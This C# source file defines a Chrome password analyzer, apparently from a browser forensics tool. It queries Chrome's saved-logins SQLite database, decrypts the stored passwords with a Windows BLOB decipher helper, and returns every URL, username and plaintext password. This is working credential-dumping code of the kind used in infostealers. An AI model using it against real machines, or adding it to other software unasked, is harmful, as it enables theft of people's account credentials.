﻿using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using BLOBDecipher;
using DTO;

namespace ChromeAnalyzer {
    public class ChromePasswordsAnalyzer : BrowserAnalyzer.PasswordsAnalyzer {
        private SQLite.Client client;
        private DataTable queryResult = null;
        private const string QUERY =
            "SELECT signon_realm AS url, username_value AS username, password_value AS pass " +
            "FROM logins " +
            "WHERE username != ''";

        public ChromePasswordsAnalyzer(string location) {
            client = new SQLite.Client(location);
        }

        public List<string> getPasswords() {
        //public List<PasswordDTO> getPasswords()
            if (queryResult == null) {
                queryResult = client.select(QUERY);
                WindowsBLOBDecipher.decipherQueryResultField("pass", queryResult);
            }

            List<string> res = new List<string>();
            //List<PasswordDTO> res = new List<PasswordDTO>();
            foreach (DataRow r in queryResult.Rows) {
                string pass = System.Text.Encoding.Default.GetString((byte[])r["pass"]);
                res.Add("PASSWORD FROM: " + r["url"] + "\r\n\tUSERNAME: " + r["username"] + "\r\n\tPASSWORD: " + pass);
                //TODO missing time
                //res.Add(new PasswordDTO(string time, "Chrome", r["url"], r["username"], pass))
            }

            return res;
        }
    }
}
